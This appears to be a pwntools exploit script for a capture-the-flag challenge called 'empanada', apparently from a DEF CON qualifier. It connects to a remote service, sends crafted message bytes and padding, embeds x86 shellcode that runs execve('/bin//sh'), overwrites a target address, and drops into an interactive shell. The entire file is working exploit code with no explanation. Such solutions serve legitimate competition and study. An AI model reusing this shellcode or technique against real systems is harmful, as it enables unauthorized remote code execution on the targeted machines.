from pwn import *

s = remote('192.168.0.85',1234)
#s = remote('empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me',47281)
raw_input()
s.send('\xbf')
s.send('\x10'+'A'*30)
s.send('\x10')
s.send('\x10'+'A'*15)

s.send('\xbf')
s.send('\x10'+'A'*30)
s.send('\x10')
s.send('\x10'+'A'*15)

s.send('\xb0')
s.send('\x10'+'K'*15)
s.send('\x10')
s.send('\x10'+'B'*15)
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
s.send('\xbf')
s.send('\xfe'+sc+'A'*0x9)
s.send('\x10')
s.send('\x10'+'P'*15)

s.send('\x90')
s.send('\x10'+'C'*15)

s.send('\x90')
s.send('\x10'+'C'*15)

s.send('\x81')
s.send('\x50')

s.send('\x81')
s.send('\x50')

s.send('\x88')
s.send('\x60'+p32(0x31337178)+'A'*3)

s.send('\x9f')
s.send('\xfe'+'A'*30)
s.interactive()
